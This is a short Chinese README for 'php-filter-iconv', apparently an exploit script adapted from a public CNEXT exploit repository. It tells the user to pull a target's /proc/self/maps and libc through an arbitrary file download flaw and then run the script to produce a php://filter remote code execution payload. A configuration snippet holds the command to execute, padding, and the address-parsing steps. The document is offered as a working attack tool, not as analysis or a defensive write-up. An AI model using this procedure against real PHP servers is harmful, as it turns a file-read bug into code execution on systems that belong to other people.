# php-filter-iconv
修改自
https://github.com/ambionics/cnext-exploits

php-filter-iconv.py用法
通过任意文件下载获取目标的/proc/self/maps和libc-2.x.so，在本机和php-filter-iconv.py放在同目录，然后运行脚本即可生成php://filter/的RCE payload，详细参数调整如下。
```
maps_path = './maps'
cmd = 'echo 123 > 1.txt'
sleep_time = 1
padding = 20

if not os.path.exists(maps_path):
    exit("[-]no maps file")

regions = get_regions(maps_path)
heap, libc_info = get_symbols_and_addresses(regions)

libc_path = libc_info.path
print("[*]download: "+libc_path)

libc_path = './libc-2.23.so'
```


